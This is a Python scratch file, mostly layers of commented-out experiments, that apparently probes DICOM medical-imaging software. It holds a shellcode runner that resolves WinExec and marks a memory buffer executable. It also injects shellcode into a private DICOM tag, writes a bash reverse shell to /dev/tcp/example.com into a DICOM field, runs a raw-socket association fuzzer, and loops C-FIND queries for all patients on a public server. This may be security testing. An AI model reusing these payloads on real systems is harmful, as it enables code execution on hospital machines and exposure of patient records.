# # # # # # # def build_associate_request(called_ae, calling_ae):
# # # # # # #     pdu_type = b'\x01'  # A-ASSOCIATE-RQ PDU Type
# # # # # # #     reserved = b'\x00'  # Reserved byte
# # # # # # #     protocol_version = b'\x00\x01'  # Protocol Version
    
# # # # # # #     # AE Titles (right-padded to 16 bytes with spaces)
# # # # # # #     called_ae_title = called_ae.rjust(16).encode('ascii')
# # # # # # #     calling_ae_title = calling_ae.rjust(16).encode('ascii')

# # # # # # #     # Reserved bytes (32 bytes)
# # # # # # #     reserved_after_titles = b'\x00' * 32

# # # # # # #     # Application Context (DICOM Application Context Name: 1.2.840.10008.3.1.1.1)
# # # # # # #     app_context_name = b'1.2.840.10008.3.1.1.1'
# # # # # # #     app_context_length = len(app_context_name).to_bytes(2, 'big')
# # # # # # #     app_context_item = b'\x10\x00' + app_context_length + app_context_name

# # # # # # #     # Presentation Context
# # # # # # #     abstract_syntax = b'1.2.840.10008.1.1'  # Verification SOP Class UID
# # # # # # #     transfer_syntax = b'1.2.840.10008.1.2'  # Implicit VR Little Endian
    
# # # # # # #     # Presentation Context ID (example, 1)
# # # # # # #     pres_context_id = b'\x01'
# # # # # # #     pres_reserved = b'\x00'
    
# # # # # # #     abstract_syntax_length = len(abstract_syntax).to_bytes(2, 'big')
# # # # # # #     transfer_syntax_length = len(transfer_syntax).to_bytes(2, 'big')
    
# # # # # # #     # Abstract Syntax Sub-item
# # # # # # #     abstract_syntax_item = b'\x30\x00' + abstract_syntax_length + abstract_syntax
    
# # # # # # #     # Transfer Syntax Sub-item
# # # # # # #     transfer_syntax_item = b'\x40\x00' + transfer_syntax_length + transfer_syntax

# # # # # # #     # Combine them into the presentation context item
# # # # # # #     pres_context_length = len(pres_context_id + pres_reserved + abstract_syntax_item + transfer_syntax_item).to_bytes(2, 'big')
# # # # # # #     pres_context_item = b'\x20\x00' + pres_context_length + pres_context_id + pres_reserved + abstract_syntax_item + transfer_syntax_item

# # # # # # #     # User Information (Max PDU Length: 16,384 bytes)
# # # # # # #     max_pdu_length = (16384).to_bytes(4, 'big')
# # # # # # #     user_info_item = b'\x50\x00\x00\x06\x51\x00\x00\x04' + max_pdu_length

# # # # # # #     # Combine all items into the PDU body
# # # # # # #     pdu_body = protocol_version + called_ae_title + calling_ae_title + reserved_after_titles + b'\x10\x00\x00\x15'
    
# # # # # # #     #app_context_item + pres_context_item + user_info_item
# # # # # # #     print("sssss",called_ae_title)
# # # # # # #     # PDU Length = Total PDU body length excluding the first 6 bytes (PDU Type, Reserved, Length)
# # # # # # #     pdu_length = len(pdu_body).to_bytes(4, 'big')
    
# # # # # # #     # Combine to form the final A-ASSOCIATE-RQ PDU
# # # # # # #     pdu = pdu_type + reserved + pdu_length + pdu_body
# # # # # # #     return pdu

# # # # # # # """ import logging
# # # # # # # from lib2to3.fixes.fix_input import context
# # # # # # # #from logging.handlers import TimedRotatingFileHandler
# # # # # # # from pynetdicom.presentation import build_context
# # # # # # # from pynetdicom import AE, evt, debug_logger ,StoragePresentationContexts
# # # # # # # from pydicom.uid import UID

# # # # # # # from pydicom.dataset import Dataset, FileDataset
# # # # # # # from pydicom.uid import generate_uid,DigitalXRayImageStorageForPresentation, JPEGLosslessSV1, JPEGBaseline8Bit, ExplicitVRLittleEndian, MRImageStorage,SecondaryCaptureImageStorage,ExplicitVRLittleEndian,ImplicitVRLittleEndian,CTImageStorage, PYDICOM_IMPLEMENTATION_UID, OphthalmicPhotography8BitImageStorage, JPEG2000 , AllTransferSyntaxes
# # # # # # # import pydicom,os,socket,json,time,random

# # # # # # # from datetime import datetime
# # # # # # from pydicom import dcmread
# # # # # # # debug_logger()
# # # # # # # ae = AE()
# # # # # # # ae.supported_contexts = StoragePresentationContexts 
# # # # # # # #ae.add_supported_context(PatientRootQueryRetrieveInformationModelGet)
# # # # # # # #ae.add_supported_context(StudyRootQueryRetrieveInformationModelGet)
# # # # # # # #ae.add_requested_context(PatientRootQueryRetrieveInformationModelGet)
# # # # # # # #ae.add_requested_context(StudyRootQueryRetrieveInformationModelGet)
# # # # # # # #ae.add_supported_context("1.2.840.10008.5.1.4.1.1.7")
# # # # # # # #ae.add_supported_context(StudyRootQueryRetrieveInformationModelFind)
# # # # # # # #ae.add_supported_context(SecondaryCaptureImageStorage,transfer_syntax="1.2.840.10008.1.2.1")
# # # # # # # #ae.add_requested_context(SecondaryCaptureImageStorage,transfer_syntax="1.2.840.10008.1.2.1")
# # # # # # # #ae.add_supported_context(SecondaryCaptureImageStorage, scu_role=True, scp_role=True)
# # # # # # # #ae.supported_contexts = AllStoragePresentationContexts


# # # # # # # # Assign the context to the AE requested contexts

# # # # # # # debug_logger()

# # # # # # # from pydicom.pixel_data_handlers.util import apply_modality_lut

# # # # # # # # Load the DICOM file
# # # # # # # ds = pydicom.dcmread('./dicom_files/received/OPT_S1')

# # # # # # # # Decompress the pixel data
# # # # # # # if ds.file_meta.TransferSyntaxUID.is_compressed:
# # # # # # #     ds.decompress()

# # # # # # # # Optionally apply LUT (if necessary)
# # # # # # # apply_modality_lut(ds.pixel_array, ds)

# # # # # # # # Save the decompressed DICOM instance
# # # # # # # ds.save_as('./dicom_files/received/decompressed_dicom.dcm')
# # # # # # # #data = pydicom.dcmread('./dicom_files/I4')
# # # # # # # #syntax = data.file_meta.TransferSyntaxUID


# # # # # # # #ds = dcmread(get_testdata_file('./dicom_files/I4'))
# # # # # # # #jpg_arr = data.pixel_array
# # # # # # # #print(jpg_arr)

# # # # # # # #replacement_pixels=np.copy(jpg_arr)
# # # # # # # #data.PixelData = replacement_pixels.tobytes()
# # # # # # # #print(data)
# # # # # # # #data.file_meta.TransferSyntaxUID=ExplicitVRLittleEndian
# # # # # # # #print(data.file_meta.TransferSyntaxUID)
# # # # # # # #data.decompress("pylibjpeg")

# # # # # # # def storeToSante():

# # # # # # #     #ae.supported_contexts = StoragePresentationContexts
# # # # # # #     #ae.supported_contexts = AllStoragePresentationContexts
# # # # # # # # Load the DICOM file to send
# # # # # # #     dataset = dcmread('./dicom_files/received/decompressed_dicom.dcm')
# # # # # # #     #ae.add_requested_context( OphthalmicPhotography8BitImageStorage, [JPEG2000] )
# # # # # # #     #ae.add_requested_context( DigitalXRayImageStorageForPresentation, [ImplicitVRLittleEndian] )
# # # # # # #     #ae.add_requested_context(SecondaryCaptureImageStorage,[ImplicitVRLittleEndian,JPEGBaseline8Bit])
# # # # # # #     #ae.add_requested_context(CTImageStorage,[JPEGLosslessSV1, JPEG2000])
# # # # # # #     #ae.add_requested_context(MRImageStorage,[JPEGLosslessSV1])
# # # # # # #     #ae.add_supported_context(MRImageStorage,[JPEGLosslessSV1],True,True)
# # # # # # #     assoc = ae.associate('172.30.160.1', 11113)

# # # # # # #     for context in assoc.accepted_contexts:
# # # # # # #         #print("requested_contexts",context)
# # # # # # #         context._as_scp=True
# # # # # # #         context._as_scu=True
# # # # # # #     for cx in assoc.accepted_contexts:
# # # # # # #         print("accepted_contexts",cx)    
    
# # # # # # #     # Define the remote DICOM server (host, port)
    

# # # # # # #     if assoc.is_established:
# # # # # # #         # Send the DICOM file via C-STORE
# # # # # # #         status = assoc.send_c_store(dataset)

# # # # # # #         # Check the status of the operation
# # # # # # #         if status:
# # # # # # #             print(f'C-STORE request status: {status.Status}')
# # # # # # #         else:
# # # # # # #             print('C-STORE request failed')

# # # # # # #         # Release the association
# # # # # # #         assoc.release()

# # # # # # # storeToSante()
# # # # # # #     abstractSyn= str(instance.SOPClassUID)
# # # # # # #     for cx in assoc.accepted_contexts:
# # # # # # #         if cx.abstract_syntax == abstractSyn:
# # # # # # #             cx.transfer_syntax[0]=UID(instance.file_meta.TransferSyntaxUID)
# # # # # # #             cx._as_scu = True
# # # # # # #             cx._as_scp = False
# # # # # # #             ae.add_requested_context(abstractSyn) 
            
 
  
# # # # # # # with open("./../../case2b_001.jpg","ab") as f:
# # # # # # #      f.write(b"teeeeeeeeeest") 
     
     
# # # # # # #    """  
# # # # # # # import pydicom
# # # # # # # import numpy as np

# # # # # # # # Load the existing DICOM file
# # # # # # # ds = pydicom.dcmread('test.dcm')
# # # # # # # #ds.PixelData = "test".encode("ISO-8859-1")

# # # # # # # #ds.Rows = 512
# # # # # # # #ds.Columns = 512
# # # # # # # #ds.BitsAllocated = 16
# # # # # # # #ds.BitsStored = 12
# # # # # # # #ds.HighBit = 11
# # # # # # # #ds.PixelRepresentation = 0
# # # # # # # #ds.SamplesPerPixel = 1
# # # # # # # #ds.PhotometricInterpretation = "MONOCHROME2"
# # # # # # # #ds.PixelData = b'\x00' * (ds.Rows * ds.Columns * 2)
# # # # # # # #pixel_data_length = ds.Rows * ds.Columns * 2 
# # # # # # # #ds.save_as('t.dcm')
# # # # # # # """ import matplotlib.pyplot as plt

# # # # # # # plt.imshow(ds.PixelData, cmap='gray')
# # # # # # # plt.title("DICOM Image")
# # # # # # # plt.axis('off')  # Hide axisclear
# # # # # # # plt.show() """


# # # # # # # """


# # # # # # # #a= print("kkko")

# # # # # # # import pydicom
# # # # # # # import numpy as np

# # # # # # # # Load the existing DICOM file
# # # # # # # ds = pydicom.dcmread('output.dcm')
# # # # # # # #ds.file_meta.TransferSyntaxUID=print('aaaaaaaaaaa')
# # # # # # # #ds.group_dataset(0x0002).clear
# # # # # # # ds.Rows = 512
# # # # # # # ds.Columns = 512
# # # # # # # ds.BitsAllocated = 16
# # # # # # # ds.BitsStored = 12
# # # # # # # ds.HighBit = 11
# # # # # # # ds.PixelRepresentation = 0
# # # # # # # ds.SamplesPerPixel = 1
# # # # # # # ds.PhotometricInterpretation = "MONOCHROME2"
# # # # # # # ds.PixelData=b'\xFF'* (ds.Rows * ds.Columns * 2)
# # # # # # # pixel_data_length = ds.Rows * ds.Columns * 2 

# # # # # # # #ds.ScanOptions= print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
# # # # # # # ds.save_as('./ttt.dcm')
# # # # # # ds=dcmread("test.dcm")

# # # # # # shellcode = b"\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\x5f\xb8\xc7\x93\xc2\x77\xff\xd0"
    
# # # # # # # Open an existing DICOM file
# # # # # # # Add the shellcode as raw byte data in a Private Tag (0x9999, 0x0010) or some other metadata field
# # # # # # # Here we convert the shellcode to a hexadecimal string representation
# # # # # # ds.add_new((0x9999, 0x0010), 'LO', shellcode)
# # # # # # # #a=ds.Manufacturer
# # # # # # import os
# # # # # # ds.save_as("test.dcm")
# # # # # # # print(ds)

# # # # # # # shellcode = b"\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\x5f\xb8\xc7\x93\xc2\x77\xff\xd0"

# # # # # # # print(shellcode)

# # # # # # # # Handle windowing if available
# # # # # # # if 'WindowWidth' in ds and 'WindowCenter' in ds:
# # # # # # #     window_width = str(ds.WindowWidth)
# # # # # # #     window_center = str(ds.WindowCenter)
# # # # # # #     pixel_array = ds.pixel_array.astype(float)
# # # # # # #     pixel_array = (pixel_array - window_center) / window_width
# # # # # # #     pixel_array = np.clip(pixel_array, -1, 1)  # Clip values to [-1, 1]
# # # # # # #     pixel_array = (pixel_array + 1) / 2  # Scale values to [0, 1]
# # # # # # # else:
# # # # # # # """
# # # # # # # pixel_array = ds.pixel_array
# # # # # # # import matplotlib.pyplot as plt

# # # # # # # # Handle photometric interpretation
# # # # # # # if ds.PhotometricInterpretation == 'MONOCHROME1':
# # # # # # #     pixel_array = 255 - pixel_array

# # # # # # # # Display the image
# # # # # # # plt.imshow(pixel_array, cmap='gray')
# # # # # # # plt.title(ds.PatientName)
# # # # # # # # #plt.show()

# # # # # # # import sys
# # # # # # # import socket
# # # # # # # from time import sleep

# # # # # # # hex_stream = "0100000000ce000100004f525448414e4320202020202020202053414e54453120202020202020202020000000000000000000000000000000000000000000000000000000000000000010000015312e322e3834302e31303030382e332e312e312e312000002e0100000030000011312e322e3834302e31303030382e312e3140000011312e322e3834302e31303030382e312e325000003b510000040000ffff52000022312e322e3330302e35353634373137332e373233383031302e352e302e332e352e345500000953414e5445534f4654"
# # # # # # # hex_stream2="02000000450000fc5a114000800600007f0000017f000001c61f2b68a3a3476111448a3a501800ffd30f00000100000000ce000100007365727665722020202020202020202053414e54453120202020202020202020000000000000000000000000000000000000000000000000000000000000000010000015312e322e3834302e31303030382e332e312e312e312000002e0100000030000011312e322e3834302e31303030382e312e3140000011312e322e3834302e31303030382e312e325000003b510000040000ffff52000022312e322e3330302e35353634373137332e373233383031302e352e302e332e352e345500000953414e5445534f4654"
# # # # # # # echoStream ="02000000450000785d914000800600007f0000017f000001cb520068909b1c389b6fcbe0501800ff0d82000004000000004a0000004601030000000004000000380000000000020012000000312e322e3834302e31303030382e312e31000000000102000000300000001001020000005f0000000008020000000101"
# # # # # # # byte_stream=""
# # # # # # # count=10
# # # # # # # try:
# # # # # # #     #while(True):
# # # # # # #         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# # # # # # #         sock.connect(('localhost', 11112))
# # # # # # #         byte_stream = bytes.fromhex(hex_stream)
# # # # # # #         sock.send(byte_stream)
# # # # # # #         sleep(0.2)
# # # # # # #         print("AAAAAAAAAAAAAAAAAA",sock.send( bytes.fromhex(echoStream)))
# # # # # # #         sock.close()
# # # # # # #         sleep(2)
# # # # # # #         count = count+10
# # # # # # # except Exception as e:
# # # # # # #     print(e)
# # # # # # #     print("Fuzzing crash at %s bytes" % str(len(byte_stream)))
# # # # # # #     sys.exit()


# # # # # # """from binascii import a2b_hex, b2a_hex
# # # # # # s = b2a_hex(byte_string).decode()

# # # # # #  print(eval("1+1"))
# # # # # # hex_stream = "0100000000ce000100004f525448414e4e20202020202020202053414e54453120202020202020202020000000000000000000000000000000000000000000000000000000000000000010000015312e322e3834302e31303030382e332e312e312e312000002e0100000030000011312e322e3834302e31303030382e312e3140000011312e322e3834302e31303030382e312e325000003b510000040000ffff52000022312e322e3330302e35353634373137332e373233383031302e352e302e332e352e345500000953414e5445534f4654"
# # # # # #  """
 
 
# # # # # # import ctypes

# # # # # # # Define shellcode that calls the dynamically resolved address for WinExec
# # # # # # shellcode = b"\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\x5f\xff\xd0"

# # # # # # # Allocate memory for the shellcode
# # # # # # shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# # # # # # # Get the handle to kernel32.dll (which contains WinExec)
# # # # # # kernel32 = ctypes.windll.kernel32
# # # # # # kernel32_handle = kernel32.GetModuleHandleA(b"kernel32.dll")

# # # # # # if not kernel32_handle:
# # # # # #     raise Exception("Failed to load kernel32.dll")

# # # # # # # Resolve the address of the WinExec function from kernel32.dll
# # # # # # winexec_address = kernel32.GetProcAddress(kernel32_handle, b"WinExec")

# # # # # # if not winexec_address:
# # # # # #     raise Exception("Failed to resolve the address of WinExec")

# # # # # # # Insert the resolved address of WinExec into the shellcode (modifying it at runtime)
# # # # # # ctypes.memmove(ctypes.addressof(shellcode_buffer) + 9, ctypes.byref(ctypes.c_void_p(winexec_address)), 4)

# # # # # # # Set the memory where the shellcode is stored to be executable
# # # # # # kernel32.VirtualProtect(ctypes.c_void_p(ctypes.addressof(shellcode_buffer)),
# # # # # #                         ctypes.c_size_t(len(shellcode)),
# # # # # #                         0x40,  # PAGE_EXECUTE_READWRITE
# # # # # #                         ctypes.byref(ctypes.c_ulong()))

# # # # # # # Cast the shellcode buffer to a function and execute it
# # # # # # shell_func = ctypes.cast(ctypes.addressof(shellcode_buffer), ctypes.CFUNCTYPE(None))
# # # # # # shell_func()
# # # # # from pydicom import dcmread
# # # # # ds = dcmread("dicom_files/received/11")
# # # # # ds.SourceImageSequence= "/bin/bash -i >& /dev/tcp/example.com/1234 0>&1"

# # # # import os
# # # # import requests

# # # # # Directory to watch for new PCAP files
# # # # pcap_directory = "."

# # # # # ntopng upload URL (change IP and port as necessary)
# # # # ntopng_url = "http://52.6.96.126/:3000/lua/pcap_upload.lua"

# # # # # Monitor the directory and upload files
# # # # for file_name in os.listdir(pcap_directory):
# # # #     if file_name.endswith(".pcapng"):
# # # #         file_path = os.path.join(pcap_directory, file_name)
# # # #         files = {'file': open(file_path, 'rb')}
# # # #         response = requests.post(ntopng_url, files=files)
# # # #         if response.status_code == 200:
# # # #             print(f"Successfully uploaded {file_name} to ntopng")
# # # #         else:
# # # #             print(f"Failed to upload {file_name}. Status: {response.status_code}")


# # # import subprocess
# # # import datetime
# # # import time
# # # import requests
# # # import os

# # # # Function to capture traffic for the day and save it at midnight
# # # def capture_traffic(interface):
# # #     while True:
# # #         # Get the current date for the file naming
# # #         current_date = datetime.datetime.now().strftime('%Y-%m-%d')
# # #         pcap_file = f"/path/to/save/traffic_{current_date}.pcap"

# # #         # Start tshark capture process
# # #         print(f"Starting capture for {current_date} on interface {interface}")
# # #         capture_process = subprocess.Popen(
# # #             ['tshark', '-i', interface, '-w', pcap_file],
# # #             stdout=subprocess.PIPE, stderr=subprocess.PIPE
# # #         )

# # #         # Calculate the time remaining until midnight
# # #         now = datetime.datetime.now()
# # #         next_midnight = (now + datetime.timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
# # #         time_until_midnight = (next_midnight - now).total_seconds()

# # #         # Wait until midnight to stop capture and rotate file
# # #         time.sleep(time_until_midnight)

# # #         # Terminate the capture process at midnight
# # #         capture_process.terminate()
# # #         capture_process.wait()
# # #         print(f"Capture stopped and saved to {pcap_file}")

# # #         # Post the pcap file to the URL
# # #         post_pcap_file(pcap_file)

# # # # Function to post the pcap file to a URL
# # # def post_pcap_file(file_path):
# # #     url = "http://examplejfjf.com/upload"
# # #     with open(file_path, 'rb') as f:
# # #         files = {'file': f}
# # #         try:
# # #             response = requests.post(url, files=files)
# # #             if response.status_code == 200:
# # #                 print(f"Successfully uploaded {file_path} to {url}")
# # #             else:
# # #                 print(f"Failed to upload {file_path}. Status code: {response.status_code}")
# # #         except Exception as e:
# # #             print(f"Error during upload: {e}")

# # # if __name__ == "__main__":
# # #     # Set the network interface you want to capture traffic on
# # #     interface = "abc"  # replace 'abc' with your actual interface
# # #     capture_traffic(interface)


# # import requests

# # def call_localhost():
# #     try:
# #         response = requests.get("http://localhost:5000")
# #         print(f"Response from localhost:5000: {response.text}")
# #     except Exception as e:
# #         print(f"Failed to call localhost:5000: {e}")

# # if __name__ == "__main__":
# #     call_localhost()
# from pynetdicom import AE, StoragePresentationContexts, QueryRetrievePresentationContexts
# from pynetdicom.sop_class import PatientRootQueryRetrieveInformationModelFind
# from pydicom.dataset import Dataset
# import time

# # Define function to send C-FIND request
# def send_c_find(ae, addr, port, query_dataset):
#     # Establish association with the PACS server
#     assoc = ae.associate(addr, port)

#     if assoc.is_established:
#         print("Association established, sending C-FIND request...")

#         # Send C-FIND request using Patient Root Information Model
#         responses = assoc.send_c_find(query_dataset, query_model=PatientRootQueryRetrieveInformationModelFind)

#         # Process the responses from the server
#         for (status, identifier) in responses:
#             if status:
#                 print(f'C-FIND response received, status: 0x{status.Status:04X}')
#                 if status.Status in (0xFF00, 0xFF01):  # Pending status
#                     print(identifier)  # Print each response received
#             else:
#                 print('Connection timed out, aborted, or received invalid response')

#         # Release the association after the request is done
#         assoc.release()
#     else:
#         print("Association failed")

# # Define the AE title and target PACS server
# ae = AE()

# # Define presentation contexts for C-FIND (Patient Root Information Model)
# ae.add_requested_context(PatientRootQueryRetrieveInformationModelFind)

# # Define the dataset (query parameters)
# query_dataset = Dataset()
# query_dataset.PatientName = '*'  # Example: search for all patients
# query_dataset.QueryRetrieveLevel = 'PATIENT'  # Set the query level

# # Set PACS server address and port
# server_address = '52.6.96.126'  # Replace with the DICOM server IP
# server_port = 104  # Replace with the DICOM server port

# # Run a while loop to continuously send C-FIND requests
# while True:
#     send_c_find(ae, server_address, server_port, query_dataset)


# Set file meta information

import pynetdicom
import pydicom
from pydicom.dataset import Dataset, FileMetaDataset
from pydicom.uid import ExplicitVRLittleEndian, generate_uid 

ds = pydicom.dcmread('./OPT_S2')
ds.SeriesInstanceUID="1.2.826.0.1.3680043.8.1055.1.20111102150758591.96842950.07877944"
ds.StudyInstanceUID= "1.2.826.0.1.3680043.8.1055.1.20111102150758591.92402465.76075429"
# ds.StudyInstanceUID = generate_uid()
# ds.SeriesInstanceUID = generate_uid()
# ds.SOPInstanceUID = generate_uid()
ds.SOPClassUID = pydicom.uid.EncapsulatedPDFStorage


# file_meta = FileMetaDataset()
# file_meta.MediaStorageSOPClassUID = pydicom.uid.EncapsulatedPDFStorage
# file_meta.MediaStorageSOPInstanceUID = ds.SOPInstanceUID
# file_meta.TransferSyntaxUID = ExplicitVRLittleEndian
# file_meta.ImplementationClassUID = generate_uid()



# ds.file_meta = file_meta

# Set specific attributes for encapsulated PDF
# ds.Modality = "CT"
# ds.ContentDate = "20231022"  # Set date
# ds.ContentTime = "120000"    # Set time
# ds.BurnedInAnnotation = "NO"
ds.MIMETypeOfEncapsulatedDocument = "application/pdf"

# Read PDF file and encapsulate it
pdf_path = "./can.pdf"
with open(pdf_path, "rb") as pdf_file:
    pdf_data = pdf_file.read()

# Set the encapsulated PDF data
ds.EncapsulatedDocument = pdf_data
#ds.PatientName="Christian Niassen"
# Save the DICOM file
output_dicom_file = "./OPT_S2"
ds.save_as(output_dicom_file)

#print(f"DICOM file with PDF embedded saved as {ds.EncapsulatedDocument}")







# from pynetdicom import AE, evt, debug_logger ,StoragePresentationContexts
# from pydicom.uid import UID

# from pydicom.dataset import Dataset, FileDataset
# from pydicom.uid import generate_uid,DigitalXRayImageStorageForPresentation, JPEGLosslessSV1, JPEGBaseline8Bit, ExplicitVRLittleEndian, MRImageStorage,SecondaryCaptureImageStorage,ExplicitVRLittleEndian,ImplicitVRLittleEndian,CTImageStorage, PYDICOM_IMPLEMENTATION_UID, OphthalmicPhotography8BitImageStorage, JPEG2000 , AllTransferSyntaxes
# import pydicom,os,socket,json,time,random

# from datetime import datetime
# from pydicom import dcmread
# debug_logger()
# ae = AE()
# ae.supported_contexts = StoragePresentationContexts 
# #ae.add_supported_context(PatientRootQueryRetrieveInformationModelGet)
# #ae.add_supported_context(StudyRootQueryRetrieveInformationModelGet)
# #ae.add_requested_context(PatientRootQueryRetrieveInformationModelGet)
# #ae.add_requested_context(StudyRootQueryRetrieveInformationModelGet)
# #ae.add_supported_context("1.2.840.10008.5.1.4.1.1.7")
# #ae.add_supported_context(StudyRootQueryRetrieveInformationModelFind)
# #ae.add_supported_context(SecondaryCaptureImageStorage,transfer_syntax="1.2.840.10008.1.2.1")
# #ae.add_requested_context(SecondaryCaptureImageStorage,transfer_syntax="1.2.840.10008.1.2.1")
# #ae.add_supported_context(SecondaryCaptureImageStorage, scu_role=True, scp_role=True)
# #ae.supported_contexts = AllStoragePresentationContexts


# # Assign the context to the AE requested contexts

# debug_logger()

# from pydicom.pixel_data_handlers.util import apply_modality_lut

# # Load the DICOM file
# ds = pydicom.dcmread('./dicom_files/received/OPT_S1')

# # Decompress the pixel data
# if ds.file_meta.TransferSyntaxUID.is_compressed:
#     ds.decompress()

# # Optionally apply LUT (if necessary)
# apply_modality_lut(ds.pixel_array, ds)

# # Save the decompressed DICOM instance
# ds.save_as('./dicom_files/received/decompressed_dicom.dcm')
# #data = pydicom.dcmread('./dicom_files/I4')
# #syntax = data.file_meta.TransferSyntaxUID


# #ds = dcmread(get_testdata_file('./dicom_files/I4'))
# #jpg_arr = data.pixel_array
# #print(jpg_arr)

# #replacement_pixels=np.copy(jpg_arr)
# #data.PixelData = replacement_pixels.tobytes()
# #print(data)
# #data.file_meta.TransferSyntaxUID=ExplicitVRLittleEndian
# #print(data.file_meta.TransferSyntaxUID)
# #data.decompress("pylibjpeg")

# def storeToSante():

#     #ae.supported_contexts = StoragePresentationContexts
#     #ae.supported_contexts = AllStoragePresentationContexts
# # Load the DICOM file to send
#     dataset = dcmread('./dicom_files/received/decompressed_dicom.dcm')
#     #ae.add_requested_context( OphthalmicPhotography8BitImageStorage, [JPEG2000] )
#     #ae.add_requested_context( DigitalXRayImageStorageForPresentation, [ImplicitVRLittleEndian] )
#     #ae.add_requested_context(SecondaryCaptureImageStorage,[ImplicitVRLittleEndian,JPEGBaseline8Bit])
#     #ae.add_requested_context(CTImageStorage,[JPEGLosslessSV1, JPEG2000])
#     #ae.add_requested_context(MRImageStorage,[JPEGLosslessSV1])
#     #ae.add_supported_context(MRImageStorage,[JPEGLosslessSV1],True,True)
#     assoc = ae.associate('172.30.160.1', 11113)

#     for context in assoc.accepted_contexts:
#         #print("requested_contexts",context)
#         context._as_scp=True
#         context._as_scu=True
#     for cx in assoc.accepted_contexts:
#         print("accepted_contexts",cx)    
    
#     # Define the remote DICOM server (host, port)
    

#     if assoc.is_established:
#         # Send the DICOM file via C-STORE
#         status = assoc.send_c_store(dataset)

#         # Check the status of the operation
#         if status:
#             print(f'C-STORE request status: {status.Status}')
#         else:
#             print('C-STORE request failed')

#         # Release the association
#         assoc.release()

